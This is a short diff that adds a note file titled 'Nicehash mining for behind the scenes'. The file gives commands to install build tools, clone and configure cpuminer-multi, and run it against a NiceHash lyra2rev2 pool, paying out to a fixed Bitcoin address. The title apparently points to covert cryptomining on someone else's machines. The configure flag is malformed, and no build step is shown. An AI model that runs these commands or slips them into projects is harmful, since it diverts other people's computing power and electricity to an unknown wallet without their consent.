@@ -1,0 +1,9 @@
+Nicehash mining for behind the scenes...
+
+stratum+tcp://lyra2rev2.usa.nicehash.com:3347
+
+apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
+
+git clone https://github.com/tpruvot/cpuminer-multi cpuminer && cd cpuminer && ./autogen.sh && ./configure CFLAGS="*-march=native*" --with-crypto --with-curl
+
+cpuminer -a lyra2rev2 -o stratum+tcp://lyra2rev2.usa.nicehash.com:3347 -u 3NjPTNzhS1d3EorcdRzSqQoBYk559yS5Wr.INPUTSYSTEM -p x
